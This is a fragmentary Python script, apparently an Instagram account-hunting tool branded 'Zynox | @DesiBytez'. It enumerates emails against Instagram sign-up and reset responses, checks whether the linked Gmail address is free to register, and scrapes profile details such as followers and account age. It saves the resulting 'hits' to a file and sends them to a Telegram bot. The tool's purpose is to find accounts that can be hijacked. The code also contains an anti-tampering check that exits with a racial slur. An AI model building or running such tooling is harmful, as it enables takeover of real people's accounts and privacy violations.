...
print('[1;92m[38;5;50mTHIS ENCODE BY Zynox | @DesiBytez ')
time.sleep(3)
try:
    ...
    if os.path.exists(api_path):
        with open(api_path, 'r') as file:
            ...
            if any(keyword in content for keyword in ['print', 'sys', 'logging', 'write', 'warn']):
                exit("Don't Try to Pull Links Nigga !! Protected by Zynox | @DesiBytez ")
...
import datetime
import sys
expiry_datetime = datetime.datetime(2029, 5, 18, 4, 00)
...
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀""")
print("\n\033[32;m                     by @DesiBytez\n\n")
token = input(f"""{RED}𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 : """)
ID = input(f"""{GREEN}𝐄𝐍𝐓𝐄𝐑 𝐈𝐃 : """)
from requests import post as pp
...
def zynoxiginfo(username,jj):
	...
	try:
		...
		try:
			...
			else:account_year='2015-16'
		except:account_year='Idk'
		if is_business or followers>100:send_to_zynox_only=True;header='True'
		else:send_to_zynox_only=False;header='False';hit_dustu+=1
		hit_data=f'''
╔════════════════════════════════════╗
║        🔥 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 🔥        ║
╠════════════════════════════════════╣
...
║ 🔄 𝗘𝗺𝗮𝗶𝗹 𝗥𝗲𝘀𝗲𝘁 : {reset_value}
╠════════════════════════════════════╣
║ 📛 𝗡𝗮𝗺𝗲       :  {user_data.get("Name","N/A")}
║ 🆔 𝗜𝗗         :  {user_data.get("ID","N/A")}
║ 👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 :  {followers}
║ 📌 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 :  {user_data.get("Following",0)}
╠════════════════════════════════════╣
║ 📖 𝗕𝗶𝗼       :  {user_data.get("Bio","N/A")}
║ 📆 𝗝𝗼𝗶𝗻𝗲𝗱     :  {account_year}
║ 📝 𝗣𝗼𝘀𝘁𝘀     :  {user_data.get("Posts",0)}
║ ℹ️ 𝗠𝗲𝘁𝗮       :  {header}
║ 🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀 :  None
╠════════════════════════════════════╣
...
╚════════════════════════════════════╝
		...
		try:
			with open('Zynox.txt','a',encoding='utf-8')as file:file.write(hit_data+'\n\n')
		except:pass
		inline_keyboard=[[{'text':'𝗝𝗢𝗜𝗡⚡','url':'https://t.me/+130HRURccyZjYWQ1'}]];data={'text':hit_data,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})};data['chat_id']=ID;requests.get(f"https://api.telegram.org/bot{token}/sendMessage",params=data)
	except:pass
def zynox(email):
	global orta_mail
	try:
		if'good'==check_gmail(email):username,jj=email.split('@');zynoxiginfo(username,jj)
		else:orta_mail+=1
	except:''
def zynoxcheck(email):
	...
	try:
		...
		if method==1:
			...
			if'email_is_taken'in str(response.text):zynox(email)
			else:kotu_insta+=1
		elif method==2:
			...
			if email in response:zynox(email)
			else:kotu_insta+=1
		elif method==3:
			...
			if'Another account is using the same email'in response.text:zynox(email)
			else:kotu_insta+=1
		elif method==4:
